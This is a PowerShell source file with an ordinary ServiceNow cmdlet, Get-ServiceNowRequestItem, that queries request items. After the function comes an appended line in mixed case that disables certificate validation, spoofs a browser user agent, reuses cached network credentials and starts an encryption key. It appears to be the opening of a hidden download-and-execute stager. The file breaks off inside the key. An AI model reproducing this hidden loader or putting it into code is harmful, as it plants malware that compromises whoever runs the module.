function Get-ServiceNowRequestItem {


    [OutputType([System.Management.Automation.PSCustomObject])]
    [CmdletBinding(DefaultParameterSetName, SupportsPaging)]
    param(
        
        [parameter(Mandatory = $false)]
        [string]$OrderBy = 'opened_at',

        
        [parameter(Mandatory = $false)]
        [ValidateSet('Desc', 'Asc')]
        [string]$OrderDirection = 'Desc',

        
        [parameter(Mandatory = $false)]
        [int]$Limit,

        
        [Parameter(Mandatory = $false)]
        [Alias('Fields')]
        [string[]]$Properties,

        
        [parameter(Mandatory = $false)]
        [hashtable]$MatchExact = @{},

        
        [parameter(Mandatory = $false)]
        [hashtable]$MatchContains = @{},

        
        [parameter(Mandatory = $false)]
        [ValidateSet('true', 'false', 'all')]
        [string]$DisplayValues = 'true',

        [Parameter(ParameterSetName = 'SpecifyConnectionFields', Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Alias('ServiceNowCredential')]
        [PSCredential]$Credential,

        [Parameter(ParameterSetName = 'SpecifyConnectionFields', Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$ServiceNowURL,

        [Parameter(ParameterSetName = 'UseConnectionObject', Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [hashtable]$Connection
    )

    
    $newServiceNowQuerySplat = @{
        OrderBy        = $OrderBy
        MatchExact     = $MatchExact
        OrderDirection = $OrderDirection
        MatchContains  = $MatchContains
    }
    $Query = New-ServiceNowQuery @newServiceNowQuerySplat

    
    $getServiceNowTableSplat = @{
        Table         = 'sc_req_item'
        Query         = $Query
        Fields        = $Properties
        DisplayValues = $DisplayValues
    }

    
    if ($null -ne $PSBoundParameters.Connection) {
        $getServiceNowTableSplat.Add('Connection', $Connection)
    }
    elseif ($null -ne $PSBoundParameters.Credential -and $null -ne $PSBoundParameters.ServiceNowURL) {
        $getServiceNowTableSplat.Add('Credential', $Credential)
        $getServiceNowTableSplat.Add('ServiceNowURL', $ServiceNowURL)
    }

    
    if ($PSBoundParameters.ContainsKey('Limit')) {
        $getServiceNowTableSplat.Add('Limit', $Limit)
    }

    
    ($PSCmdlet.PagingParameters | Get-Member -MemberType Property).Name | Foreach-Object {
        $getServiceNowTableSplat.Add($_, $PSCmdlet.PagingParameters.$_)
    }

    
    $Result = Get-ServiceNowTable @getServiceNowTableSplat
    If (-not $Properties) {
        $Result | ForEach-Object {$_.PSObject.TypeNames.Insert(0,'ServiceNow.RequestItem')}
    }
    $Result
}

[SYsTem.Net.SERViCePointManaGeR]::EXPEct100ContinUe = 0;$wC=NEW-OBjECt SystEm.Net.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaDers.AdD('User-Agent',$u);$wC.PROXY = [System.NeT.WebREqueST]::DeFaUlTWeBPROXy;$wC.PROXy.CReDeNtiaLs = [SysTEm.NeT.CrEDentiAlCAChe]::DEFauLtNEtWoRKCrEDentIAlS;$K='Ix]<!QdH%/$E^|6G3`>B4k8T?yfjA_[

